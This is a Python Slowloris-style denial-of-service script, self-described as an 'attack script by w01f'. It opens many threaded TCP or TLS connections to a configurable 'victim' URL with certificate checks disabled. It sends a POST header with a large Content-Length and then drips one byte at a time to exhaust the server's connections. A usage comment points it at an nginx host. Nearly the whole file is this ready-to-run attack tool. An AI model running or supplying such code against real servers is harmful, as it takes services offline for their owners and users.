import argparse
import socket
import ssl
import threading
import time
import urllib.parse
from http.client import HTTPConnection

def parse_args():
    parser = argparse.ArgumentParser(description="Slowloris attack script by w01f")
    parser.add_argument("--contentLength", type=int, default=1000000, help="The maximum length of fake POST body in bytes.")
    parser.add_argument("--dialWorkersCount", type=int, default=10, help="The number of workers simultaneously busy with opening new TCP connections.")
    parser.add_argument("--rampUpInterval", type=float, default=1.0, help="Interval between new connections' acquisitions for a single dial worker.")
    parser.add_argument("--sleepInterval", type=float, default=10.0, help="Sleep interval between subsequent packets sending.")
    parser.add_argument("--testDuration", type=float, default=3600.0, help="Test duration in seconds.")
    parser.add_argument("--victimUrl", type=str, default="http://127.0.0.1/", help="Victim's URL.")
    parser.add_argument("--hostHeader", type=str, default="", help="Host header value in case it is different than the hostname in victimUrl.")
    return parser.parse_args()

def dial_worker(args, victim_host_port, victim_uri, request_header):
    is_tls = victim_uri.scheme == "https"
    while True:
        time.sleep(args.rampUpInterval)
        try:
            conn = dial_victim(victim_host_port, is_tls)
            if conn:
                threading.Thread(target=do_loris, args=(conn, victim_uri, request_header, args.contentLength, args.sleepInterval)).start()
        except Exception as e:
            print(f"Error in dial_worker: {e}")

def dial_victim(host_port, is_tls):
    conn = socket.create_connection((host_port, 443 if is_tls else 80))
    conn.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 128)
    conn.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 128)
    if is_tls:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        conn = context.wrap_socket(conn, server_hostname=host_port)
    return conn

def do_loris(conn, victim_uri, request_header, content_length, sleep_interval):
    bytes_sent = 0
    try:
        conn.sendall(request_header)
        for i in range(content_length):
            time.sleep(sleep_interval)
            conn.sendall(b"A")
            bytes_sent += 1
            if i % 1000 == 0:  
                print(f"Connection to {victim_uri.netloc}: Sent {bytes_sent} bytes")
    except Exception as e:
        print(f"Error in do_loris: {e}")
    finally:
        print(f"Connection to {victim_uri.netloc}: Closed after sending {bytes_sent} bytes")
        conn.close()

def main():
    args = parse_args()
    victim_uri = urllib.parse.urlparse(args.victimUrl)
    victim_host_port = victim_uri.netloc if victim_uri.netloc else f"{victim_uri.hostname}:{'443' if victim_uri.scheme == 'https' else '80'}"
    host = args.hostHeader if args.hostHeader else victim_uri.hostname
    path = victim_uri.path if victim_uri.path else "/"
    request_header = f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {args.contentLength}\r\n\r\n".encode()

    for _ in range(args.dialWorkersCount):
        threading.Thread(target=dial_worker, args=(args, victim_host_port, victim_uri, request_header)).start()

    print(f"Launched {args.dialWorkersCount} dial workers. The test will run for {args.testDuration} seconds.")
    time.sleep(args.testDuration)

if __name__ == "__main__":
    main()
# python slowloris.py --victimUrl https://yournginxhost.com
